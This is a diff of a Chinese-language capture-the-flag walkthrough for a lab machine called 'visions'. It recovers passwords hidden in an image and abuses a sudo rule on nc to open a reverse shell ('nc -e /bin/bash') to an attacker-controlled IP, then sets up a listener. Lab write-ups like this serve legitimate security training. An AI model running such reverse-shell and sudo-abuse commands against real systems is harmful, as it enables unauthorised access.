@@ -38,7 +38,7 @@ strings white.png
 得到： pw:ihaveadream
 ```
 # 提权
-sophia/seemstobeimpossible
+
 
 
 ```C
@@ -48,3 +48,29 @@ sophia/seemstobeimpossible
 sudo -l //  (emma) NOPASSWD: /usr/bin/nc
 sudo -u emma /usr/bin/nc -e /bin/bash 192.168.44.136 2333
 ```
+
+新建一个控制台ssh连接，nc监听
+```C
+nc -lvnp 2333
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+emma@visions:~$ cat note.txt
+cat note.txt
+I cant help myself.
+emma@visions:/home$ ls
+ls
+alicia  emma  isabella  sophia
+emma@visions:/home$ cd sophia
+cd sophia
+emma@visions:/home/sophia$ ls
+ls
+flag.sh  user.txt
+emma@visions:/home/sophia$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+
+```
+可以看到home目录下还有好多其他用户，这里脑洞较为大，还得回到那张图片white.png
+把它复制到windows的world里，图片格式-->矫正-->
+sophia/seemstobeimpossible
